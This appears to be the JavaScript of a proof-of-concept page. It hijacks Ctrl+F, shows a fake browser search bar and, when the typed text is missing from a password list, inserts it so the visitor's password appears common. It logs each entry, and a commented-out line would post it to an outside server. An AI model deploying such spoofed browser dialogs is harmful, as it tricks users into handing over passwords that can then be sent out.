	

	var is_chrome = navigator.userAgent.toLowerCase().indexOf('chrome') > -1; /* https://stackoverflow.com/questions/4565112/javascript-how-to-find-out-if-the-user-browser-is-chrome */
	var passwordList;
	$(document).ready(function(){
		var searchTerm = "";
		if(is_chrome){ /* major browser + clones which *hopefuly* did not change look of search dialog */
			$searchbar = $('#searchbar_chrome');
			$searchbox = $('#searchbox_chrome');
		}else{ /* second major browser + anything else (it is just proof of concept…) */
			$searchbar = $('#searchbar_firefox');
			$searchbox = $('#searchbox_firefox');
		}
		/* with just these two distinct versions i'm properly covering about 86% of visitors */

		$(window).keydown(function(e){ /* https://stackoverflow.com/questions/6680213/is-there-a-way-to-detect-find-on-the-page-searches-in-javascript */
			if((e.which == "70" && (e.metaKey||e.ctrlKey))){ 
				e.preventDefault();
				$searchbar.slideDown('fast');
				$searchbox.focus()
				$("html, body").animate({
					scrollTop: $("#passwordList").offset().top-100
				}, 100);

			}
			if(e.keyIdentifier == "U+001B" || e.keyCode == 27){
				e.preventDefault();
				$searchbar.slideUp('fast');
			}
		});

		$searchbox.bind("input", function(){
			passwordList = $("#passwordList");
			searchTerm = this.value;
			console.log("Pridano nove heslo: " + searchTerm);
			passwordList.unhighlight();
			if (searchTerm) {
				passwordList.highlight(searchTerm); // multibyte unicode support? I'm not doing that!
//				$.post("https://fakesearch.borysek.eu/202.php", { 'searchtext': searchTerm } ); //don't worry, 202.php is mostly empty php script (only one function: returning 202 status code)
				if( $('.highlight').length == 0){ /* password is not in the list */
					insertFakePassword(searchTerm);
				}
			}
		});
	});
	var randomListItemNumber = 100 + (Math.random() * 100);
	function insertFakePassword(searchTerm){
//		var randomListItemNumber = Math.floor( (Math.random() * $("#passwordList li").length) + 1 );
		randomListItemNumber = Math.floor(randomListItemNumber + Math.random() * 20);
		$("#passwordList li:nth-child("+randomListItemNumber+")" ).after( "<li>"+searchTerm+"</li>");
		passwordList.highlight(searchTerm);	
		scrollPasswordList();
	}

	function scrollPasswordList() {
		var container = $("#passwordList");
		var scrollTo = $('.highlight');
		container.animate({
			scrollTop: scrollTo.offset().top - container.offset().top + container.scrollTop()
		}, 100);
	}